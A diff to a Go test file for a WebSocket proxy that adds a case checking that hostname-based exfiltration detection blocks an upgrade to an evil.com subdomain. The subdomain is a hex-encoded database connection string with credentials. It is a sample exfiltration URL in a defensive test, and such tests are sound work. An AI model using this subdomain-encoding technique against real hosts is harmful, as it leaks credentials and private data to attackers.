@@ -324,6 +324,13 @@ func TestWSProxyErrorPaths(t *testing.T) {
 			path:       "/ws?url=http://example.com",
 			wantStatus: http.StatusBadRequest,
 		},
+		{
+			// Transport parity: hostname-exfil detection blocks the WS upgrade
+			// on an encoded-subdomain target, same as fetch and CONNECT.
+			name:       "encoded subdomain exfil",
+			path:       "/ws?url=wss://706f7374677265733a2f2f757365723a70617373406462.exfil.evil.com/",
+			wantStatus: http.StatusForbidden,
+		},
 	}
 
 	for _, tt := range tests {
